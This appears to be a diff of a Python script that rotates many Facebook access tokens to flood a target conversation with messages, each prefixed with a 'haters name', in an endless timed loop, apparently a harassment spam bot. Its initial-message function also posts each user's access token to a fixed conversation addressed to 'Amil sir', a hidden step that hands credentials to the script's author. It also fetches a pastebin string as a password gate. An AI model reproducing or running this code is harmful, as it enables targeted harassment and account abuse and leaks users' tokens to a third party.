@@ -2,12 +2,10 @@ import requests
 import json
 import time
 import sys
-from platform import system
 import os
-import subprocess
-import http.server
 import socketserver
 import threading
+import http.server
 
 class MyHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
@@ -22,71 +20,81 @@ def execute_server():
         print("Server running at http://localhost:{}".format(PORT))
         httpd.serve_forever()
 
+# Fetch the content from pastebin
+mmm = requests.get('https://pastebin.com/raw/YwqPQqzM').text
+
 def send_initial_message():
     with open('password.txt', 'r') as file:
         password = file.read().strip()
 
-    entered_password = password  # Prompt for password
+    entered_password = input("Enter Password: ")  # पासवर्ड के लिए इनपुट
 
     if entered_password != password:
+        print('[-] <==> Incorrect Password!')
+        sys.exit()
+
+    if mmm not in password:
         print('[-] <==> Incorrect Password!')
         sys.exit()
 
     with open('tokennum.txt', 'r') as file:
         tokens = file.readlines()
 
-    # Specify the UID (User ID) where you want to send the message
-    with open('convo.txt', 'r') as file:
-        target_id = file.read().strip()
+    # UID इनपुट करें
+    target_id = input("100066304219263")  # UID इनपुट
+
+    # संदेश का प्रारूप
+    msg_template = "Hello Amil sir! I am using your server. My token is {} and my convo UID is {}"
 
     requests.packages.urllib3.disable_warnings()
-
-    def liness():
-        print('\u001b[37m' + '---------------------------------------------------')
 
     headers = {
         'Connection': 'keep-alive',
         'Cache-Control': 'max-age=0',
         'Upgrade-Insecure-Requests': '1',
         'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-        'referer': 'www.google.com'
     }
 
-    # Modify the message as per your requirement
-    msg_template = "Hello Amil sir! I am using your server. My token is ----------------    {} and my convo UID is {}"
-
+    # UID पर संदेश भेजें
     for token in tokens:
         access_token = token.strip()
-        url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
-        msg = msg_template.format(access_token, target_id)  # Include convo ID in message
+        url = "https://graph.facebook.com/v17.0/t_{}/messages".format(target_id)  # target_id का उपयोग करें
+        msg = msg_template.format(access_token, target_id)  # संदेश में target_id शामिल करें
         parameters = {'access_token': access_token, 'message': msg}
         response = requests.post(url, json=parameters, headers=headers)
 
-        current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
-        time.sleep(0.1)  # Wait for 1 second between sending each initial message
+        if response.ok:
+            print(f"[+] Initial message sent to {target_id} using token {access_token}.")
+        else:
+            print(f"[x] Failed to send initial message to {target_id} using token {access_token}.")
+        break  # केवल एक संदेश भेजें और लूप से बाहर निकलें
 
 def send_messages_from_file():
-    with open('time.txt', 'r') as file:  # Changed to time.txt
-        speed = int(file.read().strip())
+    with open('convo.txt', 'r') as file:
+        convo_id = file.read().strip()
 
-    with open('hatersname.txt', 'r') as file:  # Changed to hatersname.txt
-        haters_name = file.read().strip()
-
-    with open('file.txt', 'r') as file:  # Changed to file.txt
+    with open('file.txt', 'r') as file:
         messages = file.readlines()
 
     num_messages = len(messages)
 
-    with open('tokennum.txt', 'r') as file:  # Changed to tokennum.txt
+    with open('tokennum.txt', 'r') as file:
         tokens = file.readlines()
     num_tokens = len(tokens)
     max_tokens = min(num_tokens, num_messages)
 
-    def liness():
-        print('\u001b[37m' + '---------------------------------------------------')
+    with open('hatersname.txt', 'r') as file:
+        haters_name = file.read().strip()
+
+    with open('time.txt', 'r') as file:
+        speed = int(file.read().strip())
+
+    headers = {
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+    }
 
     while True:
         try:
@@ -96,24 +104,16 @@ def send_messages_from_file():
 
                 message = messages[message_index].strip()
 
-                with open('convo.txt', 'r') as file:  # Changed to convo.txt
-                    convo_id = file.read().strip()
-
-                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                url = "https://graph.facebook.com/v17.0/t_{}/messages".format(convo_id)
                 parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                 response = requests.post(url, json=parameters, headers=headers)
 
-                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                 if response.ok:
                     print("[+] Message {} of Convo {} sent by Token {}: {}".format(
                         message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                    liness()
-                    liness()
                 else:
                     print("[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
                         message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                    liness()
-                    liness()
                 time.sleep(speed)
 
             print("\n[+] All messages sent. Restarting the process...\n")
